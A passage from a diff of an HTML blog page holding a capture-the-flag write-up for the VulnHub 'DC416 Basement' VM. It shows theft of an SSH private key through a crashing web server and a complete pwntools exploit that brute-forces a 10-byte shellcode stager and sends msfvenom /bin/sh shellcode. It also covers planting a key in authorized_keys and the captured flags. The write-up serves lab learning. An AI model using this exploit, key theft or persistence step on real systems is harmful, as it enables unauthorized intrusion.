+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;This request crashed the webserver so let&#39;s wait a little ....&#34;</span>)
+        sleep(<span style="color:#ae81ff">30</span>)
+    <span style="color:#66d9ef">finally</span>:
+        <span style="color:#66d9ef">if</span> conn:
+            conn<span style="color:#f92672">.</span>close()
+    counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</code></pre></div><p>By executing the script the server crashed at the <code>.ssh</code> entry so it must be an issue when requesting directories. But this also drove me in the right direction to try if there is an <code>.ssh/id_rsa</code> private key file present.</p>
 <p>After modifying the script we are able to download the private key file, ssh to the server as <code>tyler</code> and get the next flag <code>flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}</code>:</p>
-
 <pre><code>root@kali:~/basement# ssh -i basement_tyler.key tyler@192.168.56.101
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -643,20 +538,12 @@ permitted by applicable law.
 Last login: Sat Dec 17 10:25:57 2016 from 192.168.56.3
 well done! your flag is flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}
 Connection to 192.168.56.101 closed.
-</code></pre>
-
-<h1 id="robert">robert</h1>
-
+</code></pre><h1 id="robert">robert</h1>
 <p>Robert&rsquo;s flag took me the most time. There is a binary running on Port 10001 requesting 10 bytes from the user and then executes them. To play with this locally I added a <code>portfwd</code> in meterpreter.</p>
-
 <p>First I tried to get some custom shellcode into the 10 bytes but none of my attempts worked and this really frustrated me. So I tried to think about the program flow and how the program could be implemented and this ended up in some kind of blind shellcode crafting.</p>
-
 <p>I thought there must be a call to <code>read</code> writing the 10 bytes to an executable area in memory and then a <code>jmp</code> or <code>call</code> instruction has to be executed to get to the custom shellcode. If we are able to execute the <code>read</code> call again using a bigger length we would be able to write shellcode to memory and execute it.</p>
-
 <p>By looking at the <a href="http://syscalls.kernelgrok.com/">sys_read</a> syscall we can see the length to read needs to go in the <code>EDX</code> register.</p>
-
 <p>So our assumption about the execution flow is the following</p>
-
 <pre><code>junk
 mmap
 junk
@@ -666,162 +553,147 @@ read 10 bytes
 junk
 jmp/call to read bytes
 junk
-</code></pre>
-
-<p>Hopefully the instruction executed is a <code>CALL</code> instruction because it pushes the current return address to the stack and executes a <code>JMP</code>. This way we could pop the adress from the stack and return to it a few instruction before and hope to hit the <code>read</code> syscall with our custom (bigger) <code>EDX</code> value.</p>
-
+</code></pre><p>Hopefully the instruction executed is a <code>CALL</code> instruction because it pushes the current return address to the stack and executes a <code>JMP</code>. This way we could pop the adress from the stack and return to it a few instruction before and hope to hit the <code>read</code> syscall with our custom (bigger) <code>EDX</code> value.</p>
 <p>My custom shellcode to pop the return address into a register, subtract a value from it and jump to it took too many bytes to also get a bigger value into <code>EDX</code>. So my approach was to execute the first read, add my custom <code>pop</code>, <code>sub</code>, <code>jmp</code> shellcode and also double the value in the <code>EDX</code> register which hopefully is still <code>10</code>. When executing this code a few times we should be able to double <code>EDX</code> on each run, execute a read with a big value and finally execute our shellcode. So for this to work a <code>CALL</code> instruction needs to be executed and <code>EDX</code> must not be changed.</p>
-
 <p>This approach was a lot try and error because there is absolutely no response but after doing hundreds of runs I finally was able to execute my own shellcode!</p>
-
 <p>The script does the following</p>
-
 <ul>
 <li>generate the maximum 10 byte payload:
-
-<ul>
-<li>double the value in EDX (add edx, edx)</li>
-<li>pop the return value from the stack into a register</li>
-<li>subtract a value from it</li>
-<li>jump to the new value and hope we hit a location where the read call is executed</li>
-</ul></li>
+_ double the value in EDX (add edx, edx)
+_ pop the return value from the stack into a register
+_ subtract a value from it
+_ jump to the new value and hope we hit a location where the read call is executed</li>
 <li>sends the payload the first time. If we hit the correct value to subtract a new read should be executed</li>
 <li>sends the payload over and over again, every time doubling the value in EDX</li>
 <li>once we reach the desired length in <code>EDX</code> the shellcode is sent and the <code>CALL</code> instruction calls it</li>
 </ul>
-
 <p>To find the value to subtract from EDX we simply loop over 0 till 255 and try every value. This will jump in one byte steps relative to the <code>CALL</code> instruction till we hit the <code>READ</code> call again.</p>
-
 <p>Once the correct offset is found, <code>/bin/sh</code> is executed and we have a shell as <code>robert</code>!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 
-<pre><code class="language-python">#!/usr/bin/env python2
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-from pwn import *
+context(bits<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>,
+        os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>,
+        aslr<span style="color:#f92672">=</span>False,
+        <span style="color:#75715e"># log_level=&#39;DEBUG&#39;,</span>
+        terminal<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;45&#39;</span>])
 
-context(bits=64,
-        os='linux',
-        aslr=False,
-        # log_level='DEBUG',
-        terminal=['tmux', 'splitw', '-l', '45'])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode_payload</span>(p):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x{:02x}&#34;</span><span style="color:#f92672">.</span>format(ord(c)) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> p)
 
-def encode_payload(p):
-    return &quot;&quot;.join(&quot;\\x{:02x}&quot;.format(ord(c)) for c in p)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_iterations</span>(number):
+    number <span style="color:#f92672">=</span> float(number)
+    iterations <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">while</span> number <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">10.0</span>:
+        iterations <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+        number <span style="color:#f92672">/=</span> <span style="color:#ae81ff">2</span>
+    <span style="color:#66d9ef">return</span> iterations
 
-def calculate_iterations(number):
-    number = float(number)
-    iterations = 0
-    while number &gt;= 10.0:
-        iterations += 1
-        number /= 2
-    return iterations
+local <span style="color:#f92672">=</span> False
+<span style="color:#75715e">#  local = True</span>
+debug <span style="color:#f92672">=</span> False
 
-local = False
-#  local = True
-debug = False
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 
-offset = 0
+<span style="color:#75715e"># the read call should be in the last 255 bytes</span>
+<span style="color:#66d9ef">while</span> offset <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">255</span>:
+    <span style="color:#66d9ef">try</span>:
+        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Trying offset {}&#34;</span><span style="color:#f92672">.</span>format(offset))
+        <span style="color:#66d9ef">if</span> local:
+            p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./tenbytes&#34;</span>)
+            <span style="color:#66d9ef">if</span> debug:
+                gdb_cmd <span style="color:#f92672">=</span> []
+                <span style="color:#75715e">#  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(0x00400697))</span>
+                gdb_cmd<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;c&#34;</span>)
+                gdb_cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(gdb_cmd)
+                gdb<span style="color:#f92672">.</span>attach(p, execute<span style="color:#f92672">=</span>gdb_cmd)
+                raw_input(<span style="color:#e6db74">&#34;Press enter when GDB is running&#34;</span>)
+        <span style="color:#66d9ef">else</span>:
+            p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">10001</span>)
 
-# the read call should be in the last 255 bytes
-while offset &lt;= 255:
-    try:
-        log.info(&quot;Trying offset {}&quot;.format(offset))
-        if local:
-            p = process(&quot;./tenbytes&quot;)
-            if debug:
-                gdb_cmd = []
-                #  gdb_cmd.append(&quot;b *{:#08x}&quot;.format(0x00400697))
-                gdb_cmd.append(&quot;c&quot;)
-                gdb_cmd = &quot;\n&quot;.join(gdb_cmd)
-                gdb.attach(p, execute=gdb_cmd)
-                raw_input(&quot;Press enter when GDB is running&quot;)
-        else:
-            p = remote(&quot;127.0.0.1&quot;, 10001)
+        <span style="color:#75715e"># EDX: how many bytes to read</span>
+        <span style="color:#75715e"># so do a loop, double the bytes in EDX</span>
+        <span style="color:#75715e"># till we have our desired value,</span>
+        <span style="color:#75715e"># pop the return adress into rdi</span>
+        <span style="color:#75715e"># and bruteforce our way back the stack</span>
+        <span style="color:#75715e"># till we reach a point where the read loop</span>
+        <span style="color:#75715e"># is executed again</span>
+        <span style="color:#75715e"># after our loop we should be able to read</span>
+        <span style="color:#75715e"># a bigger value to the stack and execute it</span>
+        payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\xd2</span><span style="color:#e6db74">&#34;</span>       <span style="color:#75715e"># add edx, edx</span>
+        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5f</span><span style="color:#e6db74">&#34;</span>           <span style="color:#75715e"># pop rdi</span>
+        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xef</span><span style="color:#e6db74">&#34;</span>   <span style="color:#75715e"># sub rdi, xxx</span>
+        payload <span style="color:#f92672">+=</span> chr(offset)
+        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xe7</span><span style="color:#e6db74">&#34;</span>       <span style="color:#75715e"># jmp rdi</span>
+        payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">10</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span>)
 
-        # EDX: how many bytes to read
-        # so do a loop, double the bytes in EDX
-        # till we have our desired value,
-        # pop the return adress into rdi
-        # and bruteforce our way back the stack
-        # till we reach a point where the read loop
-        # is executed again
-        # after our loop we should be able to read
-        # a bigger value to the stack and execute it
-        payload  = &quot;&quot;
-        payload += &quot;\x01\xd2&quot;       # add edx, edx
-        payload += &quot;\x5f&quot;           # pop rdi
-        payload += &quot;\x48\x83\xef&quot;   # sub rdi, xxx
-        payload += chr(offset)
-        payload += &quot;\xff\xe7&quot;       # jmp rdi
-        payload = payload.ljust(10, &quot;\x90&quot;)
+        <span style="color:#66d9ef">if</span> len(payload) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>:
+            log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Payload too long! ({} bytes). Offset {}&#34;</span><span style="color:#f92672">.</span>format(len(payload), offset))
 
-        if len(payload) &gt; 10:
-            log.error(&quot;Payload too long! ({} bytes). Offset {}&quot;.format(len(payload), offset))
+        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Payload: {}&#34;</span><span style="color:#f92672">.</span>format(encode_payload(payload)))
 
-        log.info(&quot;Payload: {}&quot;.format(encode_payload(payload)))
+        p<span style="color:#f92672">.</span>recvline() <span style="color:#75715e"># receive greeting</span>
 
-        p.recvline() # receive greeting
+        <span style="color:#75715e">#  1:   0x10     = 10</span>
+        <span style="color:#75715e">#  2:   0x14     = 20</span>
+        <span style="color:#75715e">#  3:   0x28     = 40</span>
+        <span style="color:#75715e">#  4:   0x50     = 80</span>
+        <span style="color:#75715e">#  5:   0xA0     = 160</span>
+        <span style="color:#75715e">#  6:   0x140    = 320</span>
+        <span style="color:#75715e">#  7:   0x280    = 640</span>
+        <span style="color:#75715e">#  8:   0x500    = 1280</span>
+        edx_should_be <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x500</span> <span style="color:#75715e"># length of the next read</span>
+        iterations <span style="color:#f92672">=</span> calculate_iterations(edx_should_be)
+        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Iterations: {}&#34;</span><span style="color:#f92672">.</span>format(iterations))
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, iterations):
+            p<span style="color:#f92672">.</span>send(payload)
+        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;EDX should now be {:#4x}&#34;</span><span style="color:#f92672">.</span>format(edx_should_be))
 
-        #  1:   0x10     = 10
-        #  2:   0x14     = 20
-        #  3:   0x28     = 40
-        #  4:   0x50     = 80
-        #  5:   0xA0     = 160
-        #  6:   0x140    = 320
-        #  7:   0x280    = 640
-        #  8:   0x500    = 1280
-        edx_should_be = 0x500 # length of the next read
-        iterations = calculate_iterations(edx_should_be)
-        log.info(&quot;Iterations: {}&quot;.format(iterations))
-        for i in range(1, iterations):
-            p.send(payload)
-        log.info(&quot;EDX should now be {:#4x}&quot;.format(edx_should_be))
+        <span style="color:#75715e"># second stage</span>
+        <span style="color:#75715e">#  ./msfvenom -p linux/x64/exec cmd=/bin/sh -f py -v shell</span>
+        <span style="color:#75715e">#  No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span>
+        <span style="color:#75715e">#  No Arch selected, selecting Arch: x64 from the payload</span>
+        <span style="color:#75715e">#  No encoder or badchars specified, outputting raw payload</span>
+        <span style="color:#75715e">#  Payload size: 47 bytes</span>
+        <span style="color:#75715e">#  Final size of py file: 248 bytes</span>
+        shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcc</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">if</span> local <span style="color:#f92672">and</span> debug <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;&#34;</span>
+        shell <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68</span><span style="color:#e6db74">&#34;</span>
+        shell <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6</span><span style="color:#e6db74">&#34;</span>
+        shell <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68</span><span style="color:#e6db74">&#34;</span>
+        shell <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x56\x57\x48\x89\xe6\x0f\x05</span><span style="color:#e6db74">&#34;</span>
 
-        # second stage
-        #  ./msfvenom -p linux/x64/exec cmd=/bin/sh -f py -v shell
-        #  No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-        #  No Arch selected, selecting Arch: x64 from the payload
-        #  No encoder or badchars specified, outputting raw payload
-        #  Payload size: 47 bytes
-        #  Final size of py file: 248 bytes
-        shell = &quot;\xcc&quot; if local and debug else &quot;&quot;
-        shell += &quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68&quot;
-        shell += &quot;\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6&quot;
-        shell += &quot;\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68&quot;
-        shell += &quot;\x00\x56\x57\x48\x89\xe6\x0f\x05&quot;
+        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Sending shellcode&#34;</span>)
+        p<span style="color:#f92672">.</span>send(shell)
 
-        log.info(&quot;Sending shellcode&quot;)
-        p.send(shell)
+        <span style="color:#66d9ef">if</span> local:
+            <span style="color:#75715e"># if we are local there is no tty error message</span>
+            sleep(<span style="color:#ae81ff">0.1</span>)
+            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;id&#34;</span>)
+            output <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span>)
+            <span style="color:#66d9ef">if</span> output <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;uid=&#34;</span> <span style="color:#f92672">in</span> output:
+                log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Found offset!!! {}&#34;</span><span style="color:#f92672">.</span>format(offset))
+                <span style="color:#66d9ef">break</span>
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#75715e"># check for no tty message</span>
+            p<span style="color:#f92672">.</span>sendline()
+            output <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
+            <span style="color:#66d9ef">if</span> output <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;tty&#34;</span> <span style="color:#f92672">in</span> output:
+                log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Found offset!!! {}&#34;</span><span style="color:#f92672">.</span>format(offset))
+                <span style="color:#66d9ef">break</span>
 
-        if local:
-            # if we are local there is no tty error message
-            sleep(0.1)
-            p.sendline(&quot;id&quot;)
-            output = p.recvline(timeout=0.1)
-            if output and &quot;uid=&quot; in output:
-                log.info(&quot;Found offset!!! {}&quot;.format(offset))
-                break
-        else:
-            # check for no tty message
-            p.sendline()
-            output = p.recvline(timeout=0.5)
-            if output and &quot;tty&quot; in output:
-                log.info(&quot;Found offset!!! {}&quot;.format(offset))
-                break
+        <span style="color:#66d9ef">if</span> offset <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>:
+            log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;No valid offset found!&#34;</span>)
+        p<span style="color:#f92672">.</span>close()
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+        log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;Error on offset {}&#34;</span><span style="color:#f92672">.</span>format(offset))
+        p<span style="color:#f92672">.</span>close()
+    <span style="color:#66d9ef">finally</span>:
+        offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
 
-        if offset == 255:
-            log.error(&quot;No valid offset found!&quot;)
-        p.close()
-    except EOFError:
-        log.warning(&quot;Error on offset {}&quot;.format(offset))
-        p.close()
-    finally:
-        offset += 1
-
-p.interactive()
-</code></pre>
-
-<p>Last output from the run:</p>
-
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Last output from the run:</p>
 <pre><code>[+] Opening connection to 127.0.0.1 on port 10001: Done
 [*] Payload: \x01\xd2\x5f\x48\x83\xef\x25\xff\xe7\x90
 [*] Iterations: 8
@@ -832,18 +704,11 @@ p.interactive()
 $ $ id
 uid=1003(robert) gid=1003(robert) groups=1003(robert)
 $ $
-</code></pre>
-
-<p>Now we are able to add our private key file to <code>/home/robert/.ssh/authorized_keys</code> connect as <code>robert</code> via SSH and get the next flag <code>flag{t3N_byt3$_0ugHt_t0_b3_eN0uGh_f0R_4nyb0dY}</code></p>
-
+</code></pre><p>Now we are able to add our private key file to <code>/home/robert/.ssh/authorized_keys</code> connect as <code>robert</code> via SSH and get the next flag <code>flag{t3N_byt3$_0ugHt_t0_b3_eN0uGh_f0R_4nyb0dY}</code></p>
 <p>Now we can also get the <code>tenbytes</code> binary and look at it to confirm our script</p>
-
-<p><img src="/img/vulnhub_dc416_basement/binaryninja.png" alt="binaryninja" /></p>
-
+<p><img src="/img/vulnhub_dc416_basement/binaryninja.png" alt="binaryninja"></p>
 <p>Thanks <a href="https://twitter.com/barrebas">@barrebas</a> for a lot hours trying to blindly bruteforce the binary :)</p>
-
 <p>The flags:</p>
-
 <pre><code>flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
 flag{bR4in_paRas1te$}
 flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}
@@ -861,7 +726,7 @@ flag{l4y3rs_up0n_l4y3rs}
         </ul>
     </div>
 </div>
-<script type="text/javascript" src='https://firefart.at/js/all.min.js'></script>
+<script type="text/javascript" src='https://firefart.at/js/all.js'></script>
 <script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>
 
 <script type="text/javascript">
@@ -870,19 +735,27 @@ flag{l4y3rs_up0n_l4y3rs}
     _paq.push(["setCookieDomain", "*.firefart.at"]);
     _paq.push(['trackPageView']);
     _paq.push(['enableLinkTracking']);
-    (function() {
-        var u="https://tracking.firefart.at/";
-        _paq.push(['setTrackerUrl', u+'mat.php']);
+    (function () {
+        var u = "https://tracking.firefart.at/";
+        _paq.push(['setTrackerUrl', u + 'mat.php']);
         _paq.push(['setSiteId', '1']);
-        var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
-        g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'mat.js'; s.parentNode.insertBefore(g,s);
+        var d = document,
+            g = d.createElement('script'),
+            s = d.getElementsByTagName('script')[0];
+        g.type = 'text/javascript';
+        g.async = true;
+        g.defer = true;
+        g.src = u + 'mat.js';
+        s.parentNode.insertBefore(g, s);
     })();
 </script>
-<noscript><p><img src="https://tracking.firefart.at/mat.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p></noscript>
-
+<noscript>
+    <p><img src="https://tracking.firefart.at/mat.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p>
+</noscript>
 
         </div>
     </div>
 </div>
 </body>
+
 </html>
